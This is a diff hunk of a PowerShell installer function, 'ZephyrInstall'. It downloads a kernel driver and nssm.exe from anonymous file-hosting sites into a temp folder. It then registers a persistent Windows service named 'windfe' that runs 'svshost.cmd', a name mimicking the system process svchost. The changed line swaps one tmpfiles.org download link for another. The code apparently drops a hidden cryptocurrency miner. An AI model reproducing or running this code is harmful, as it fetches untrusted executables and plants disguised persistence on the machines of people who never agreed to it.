@@ -27,7 +27,7 @@ function ZephyrInstall {
     Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/WinRing0x64.sys' -OutFile "$env:TEMP\temp\WinRing0x64.sys"
 
     # Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/nssm.exe' -OutFile "$env:TEMP\temp\nssm.exe"
-    Invoke-WebRequest -Uri 'https://tmpfiles.org/dl/3684775/nssm.exe' -OutFile "$env:TEMP\temp\nssm.exe"
+    Invoke-WebRequest -Uri 'https://tmpfiles.org/dl/3685674/nssm.exe' -OutFile "$env:TEMP\temp\nssm.exe"
 
     .\nssm.exe install 'windfe' "$env:TEMP\temp\svshost.cmd"
     Start-Sleep -Seconds 1
